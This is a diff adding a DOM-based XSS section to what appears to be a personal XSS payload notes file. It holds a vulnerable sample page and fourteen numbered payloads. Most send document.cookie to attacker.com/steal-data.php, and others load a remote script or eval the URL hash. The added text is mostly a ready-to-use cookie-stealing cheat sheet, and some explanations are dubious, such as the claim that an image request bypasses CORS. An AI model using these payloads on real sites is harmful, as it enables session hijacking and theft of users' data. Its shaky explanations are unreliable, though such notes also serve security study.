@@ -236,3 +236,99 @@ b)   HTML TAG ATTRIBUTES :-
               ways of executing alert() without triggering AngularJS's window detection:
 
               [1].map(alert)
+
+                                                         DOM BASED XSS  :-----
+
+    DOM-based XSS (Document Object Model-based Cross-Site Scripting) is a type of XSS attack where the payload is executed as a result of modifying 
+    the Document Object Model (DOM) environment in the victim's browser. Unlike Reflected XSS and Stored XSS, which involve injecting malicious 
+    payloads into web pages through user input, DOM-based XSS involves modifying the behavior of a web page through JavaScript code after the 
+    browser has loaded the page.
+
+    EX :--
+
+    <html>
+        <head>
+          <script>
+            function showMessage(message) {
+              alert(message);
+            }
+          </script>
+        </head>
+        <body>
+          <button onclick="showMessage(location.hash.substr(1))">Show Message</button>
+        </body>
+    </html>
+
+In this example, the showMessage() function takes a message as an argument and displays it in an alert box. 
+The payload is passed to the function through the location, and the Hash property is part of the URL that comes after the "#" symbol. 
+To trigger the DOM-based XSS attack, an attacker could craft a URL that includes a malicious payload in the hash:
+
+http://example.com/#<script>alert('XSS Attack')</script>
+
+ii) This payload will redirect users to a malicious website and send their cookie data as a query string.
+    <script>location.href='http://attacker.com/steal-data.php?'+document.cookie</script>
+iii) This payload will modify the page's contents to include an image tag that sends the user's cookie data to a malicious website.
+   <script>document.body.innerHTML='<img src="http://attacker.com/steal-data.php?c='+document.cookie+'"/>'</script>
+
+                                              (IF THERE IS CORS )
+iv) This payload creates a new image object and sets its src property to a URL that includes the user's cookie data. 
+    This is often used to bypass CORS (Cross-Origin Resource Sharing) restrictions and send data to a malicious website.
+    
+    <script>new Image().src='http://attacker.com/steal-data.php?c='+encodeURI(document.cookie)</script>
+
+v)  This payload creates an XMLHttpRequest object and sends the user's cookie data to a malicious website.
+    <script>
+      var xhr = new XMLHttpRequest(); 
+      xhr.open("GET", "http://attacker.com/steal-data.php?c=" + encodeURI(document.cookie), true); 
+      xhr.send();
+   </script>
+
+vi) This payload creates a new script element and sets its src property to a malicious script hosted on a remote server.
+     <script>
+       var s = document.createElement("script"); s.src = "http://attacker.com/evil-script.js"; document.body.appendChild(s);
+     </script>
+
+vii)  This payload uses the eval() function to execute any JavaScript code passed in the URL hash
+       <script>eval(location.hash.substr(1))</script>
+
+viii)  This payload modifies the page to include an image tag that sends the user's cookie data to a malicious website.
+       <script>document.write("<img src='http://attacker.com/steal-data.php?c=" + document.cookie + "'>")</script>
+
+ix)  This payload creates a new image object and sets its src property to a URL that includes the user's cookie data. 
+     The image is then added to the page, which sends the data to a malicious website.
+     <script>
+     var i = new Image(); i.src = "http://attacker.com/steal-data.php?c=" + document.cookie; document.body.appendChild(i);
+     </script>
+ x)  This payload creates a new form element and sets it's action and method properties to a URL and HTTP method controlled by the attacker. 
+     The form includes a hidden input field that contains the user's cookie data, which is then submitted to the malicious website.
+     <script>
+     var form = document.createElement("form"); 
+     form.action = "http://attacker.com/steal-data.php"; form.method = "POST"; form.innerHTML = "<input 
+     type='hidden' name='c' value='" + document.cookie + "'>"; document.body.appendChild(form); form.submit();
+    </script>
+xi)  This payload uses the btoa() function to encode the user's cookie data as a base64 string, which is then included 
+      in the URL of a request to a malicious website.
+
+      <script>document.location.href = "http://attacker.com/steal-data.php?c=" + btoa(document.cookie);</script>
+
+xii)  This payload creates a new script element and sets its src property to a JavaScript expression that displays 
+      an alert containing the user's cookie data.
+      <script>
+       var s = document.createElement("script"); s.src = "javascript:alert(document.cookie)"; 
+       document.body.appendChild(s);
+      </script>
+xiii) This payload creates a new link element and sets its href property to a JavaScript expression that displays an 
+      alert containing the user's cookie data. The link is then added to the page, allowing the attacker to steal sensitive 
+      information when the user clicks the link.
+
+      <script>var a = document.createElement("a"); a.href = "javascript:alert(document.cookie)"; 
+        a.innerHTML = "click me"; document.body.appendChild(a);
+      </script>
+
+xiv) This payload creates a new iframe element and sets its src property to a JavaScript expression that displays an 
+     alert containing the user's cookie data.
+     <script>
+     var iframe = document.createElement("iframe"); iframe.src = "javascript:alert(document.cookie)"; 
+     document.body.appendChild(iframe);
+     </script>
+
